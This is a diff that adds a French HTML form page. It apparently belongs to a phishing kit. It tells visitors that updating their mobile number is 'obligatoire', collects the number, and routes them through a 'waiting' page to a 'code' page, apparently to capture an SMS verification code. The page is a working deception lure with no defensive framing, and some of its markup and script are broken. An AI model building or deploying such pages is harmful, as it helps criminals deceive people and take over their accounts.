@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/app.css">
+    <title>Mobile</title>
+</head>
+<body>
+
+
+<main>
+    <div class="form">
+
+    <div class="logo">
+
+<img src="img/logo.png" >
+</div>
+
+
+    <div class="continer">
+
+      
+<form action="attendez.html" method="post">
+
+<h2 style="text-align: center;">Afin de maintenir la qualit&eacute; de nos services, la mise &agrave; jour de votre num&eacute;ro de t&eacute;l&eacute;phone portable est <strong>obligatoire</strong>.</h2>
+<div class="col"><h4 style="font-weight:normal ;text-align:left;">Entrez votre numéro de téléphone pour continuer.</h4> </div>
+
+<div class="col">
+<input type="number" placeholder="Entrez votre numéro de téléphone." name="number" required> <br> 
+
+
+<div class="but">
+    <button type="submit">Confirmer</button>
+</div>
+
+ </main>
+
+    <script>
+        /**
+         * Récupère le formulaire et ajoute un écouteur d'événement pour la soumission.
+         */
+        const form = document.getElementById('mobile-form');
+        form.addEventListener('submit', function(event) {
+            // Empêche la soumission du formulaire par défaut.
+            event.preventDefault();
+            
+            // Définit l'URL de la page de chargement, en y ajoutant la page finale comme paramètre.
+            const loadingPageUrl = `attendez.html?next=code.html`;
+            
+            // Redirige l'utilisateur vers la page de chargement.
+            window.location.href = loadingPageUrl;
+        });
+    </script>
+
+
+
+
+
+    <script src="main.js"></script>
+</body>
+</html>
